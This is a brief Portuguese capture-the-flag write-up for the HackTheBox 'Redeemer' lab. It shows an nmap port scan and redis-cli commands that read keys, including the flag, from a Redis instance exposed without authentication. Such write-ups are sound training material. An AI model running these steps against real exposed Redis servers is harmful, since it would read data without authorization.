Redeemer

HackTheBox, Very Easy

Redeemer trata do Redis, um banco de dados em memória (porta 6379). A instância está exposta sem autenticação, permitindo leitura direta das chaves.

Reconhecimento

A varredura completa de portas revela o Redis na porta 6379.

nmap -sV -p- <IP>

Exploração

Com o redis-cli conecta-se ao serviço, inspecionam-se as informações e seleciona-se o banco padrão para listar as chaves, uma delas contém a flag.

redis-cli -h <IP>
info
select 0
keys *
get flag
